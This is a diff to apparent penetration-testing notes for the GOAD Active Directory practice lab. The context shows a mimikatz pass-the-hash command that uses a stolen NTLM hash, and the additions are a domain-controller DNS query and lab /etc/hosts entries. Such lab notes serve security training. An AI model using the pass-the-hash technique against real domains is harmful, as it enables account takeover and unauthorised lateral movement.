@@ -151,3 +151,31 @@ Verify you have valid domain authentication using the net binary.
 2. Use the following command with mimikatz:
 Create a CMD with the context of the NT hash from the user. This will allow you to interact with the domain much easier.
 #### `sekurlsa:pth /user:samaccountname /domain:domainname /dc:dcfqdn /ntlm:string`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
+
+# /etc/hosts
+# GOAD
+192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
+192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
+192.168.56.12   essos.local meereen.essos.local meereen
+192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
+192.168.56.23   braavos.essos.local braavos
+
+
+
+
+
